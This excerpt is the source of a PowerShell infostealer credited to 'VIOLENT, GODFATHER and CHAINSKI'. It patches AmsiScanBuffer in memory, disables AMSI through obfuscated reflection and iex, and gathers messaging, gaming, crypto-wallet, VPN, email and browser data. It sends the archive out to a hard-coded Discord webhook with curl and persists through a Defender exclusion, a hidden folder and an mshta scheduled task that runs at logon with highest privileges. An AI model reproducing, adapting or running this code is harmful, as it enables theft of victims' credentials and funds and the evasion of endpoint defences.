...
public class ogknl {
    ...
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr wztoyu, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ogknl

$zjxztsh = [ogknl]::LoadLibrary("$([Char]([BYTE]0x61)+[CHar](109)+[chAR]([BYtE]0x73)+[ChAR]([BYte]0x69)+[chAR]([bYte]0x2e)+[ChAR](100*65/65)+[ChAR]([ByTe]0x6c)+[chAR]([BYte]0x6c))")
$emppks = [ogknl]::GetProcAddress($zjxztsh, "$(('ÁmsíScá'+'nBuffer').NOrmAlize([char]([byTE]0x46)+[CHAr]([bYte]0x6f)+[chAr]([bytE]0x72)+[cHar](109*32/32)+[chAr]([BYte]0x44)) -replace [ChaR](31+61)+[chAr]([ByTE]0x70)+[chAr]([bYtE]0x7b)+[char]([BYTE]0x4d)+[ChAr]([BYtE]0x6e)+[cHar]([bYtE]0x7d))")
$p = 0
[ogknl]::VirtualProtect($emppks, [uint32]5, 0x40, [ref]$p)
$jvji = "0xB8"
$tfkk = "0x57"
$lofg = "0x00"
$rxwt = "0x07"
$cflt = "0x80"
$visf = "0xC3"
$lerko = [Byte[]] ($jvji,$tfkk,$lofg,$rxwt,+$cflt,+$visf)
[System.Runtime.InteropServices.Marshal]::Copy($lerko, 0, $emppks, 6)
...
$webhook = "https://discord.com/api/webhooks/1222897810354212924/lINLea9JfsuO7fRgbbsbq8Y6cXo7RCrVJDA7AC6VPHu0flBq-5z4GYGwpKoDX5vGZWBt"
$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"


# Request admin with AMSI bypass
function INVOKE-AC {
    ${VIOLENT} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp")) | &([regex]::Unescape("\u0069\u0065\u0078"))
    $VIOLENTcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $VIOLENTcheck
}
...
function HOSTS-BLOCKER {
    $VIOLENT = Select-String -Path "$env:windir\System32\Drivers\etc\hosts" -Pattern "GODFATHER"
    if ($VIOLENT -ne $null) {}else {
...
function Backup-Data {
    $folder_general = "$env:APPDATA\VIOLENT\DATA"
    $folder_messaging = "$env:APPDATA\VIOLENT\DATA\Messaging Sessions"
    $folder_gaming = "$env:APPDATA\VIOLENT\DATA\Gaming Sessions"
    $folder_crypto = "$env:APPDATA\VIOLENT\DATA\Crypto Wallets"
    $folder_vpn = "$env:APPDATA\VIOLENT\DATA\VPN Clients"
    $folder_email = "$env:APPDATA\VIOLENT\DATA\Email Clients"
    $important_files = "$env:APPDATA\VIOLENT\DATA\Important Files"
    $browser_data = "$env:APPDATA\VIOLENT\DATA\Browser Data"
    ...
    $embed_and_body = @{
        ...
        "embeds"      = @(
            @{
                ...
                "color"       = "3447003"
                "footer"      = @{
                    "text" = "Made by VIOLENT, GODFATHER and CHAINSKI"
                }
                "thumbnail"   = @{
    ...
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"VIOLENT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
    ...
    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\VIOLENT.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"VIOLENT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\VIOLENT.zip" $webhook

    Remove-Item "$env:LOCALAPPDATA\Temp\VIOLENT.zip" -Force
...
function Invoke-TASKS {
    ...
    Add-MpPreference -ExclusionPath "$env:APPDATA\VIOLENT"
    New-Item -ItemType Directory -Path "$env:APPDATA\VIOLENT" -Force
    # Hidden Directory
    $VIOLENT_DIR = get-item "$env:APPDATA\VIOLENT" -Force
    $VIOLENT_DIR.attributes = "Hidden", "System"
    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\VIOLENT\VIOLENT.ps1" -Force
    $task_name = "VIOLENT"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\VIOLENT\VIOLENT.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "VIOLENT" -RunLevel Highest -Force
